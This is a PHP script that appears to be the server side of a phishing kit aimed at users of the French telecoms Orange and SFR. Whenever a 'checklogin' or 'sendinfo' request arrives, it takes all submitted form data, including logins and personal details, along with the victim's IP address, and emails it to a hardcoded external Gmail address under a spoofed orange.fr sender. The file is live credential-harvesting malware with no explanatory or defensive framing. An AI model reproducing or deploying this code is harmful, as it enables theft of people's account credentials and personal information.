<?php 
$ip = "";

function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function send_result($data){
  $email = 'jacquetdenis19@gmail.com';
  $ip = get_client_ip();
  $m = "Result <$ip>\n\r";
  foreach($data as $k => $v){
    $m .= "$k : $v \n\r";
  }
  $headers = "From: webmaster@orange.fr" . "\r\n";

  mail($email,"sfr : $ip",$m,$headers);
}

$ip  = get_client_ip();

if(isset($_GET['checklogin'])){
    send_result($_POST);
    die();
}
if(isset($_GET['sendinfo'])){
    send_result($_POST);
    die();
}
?>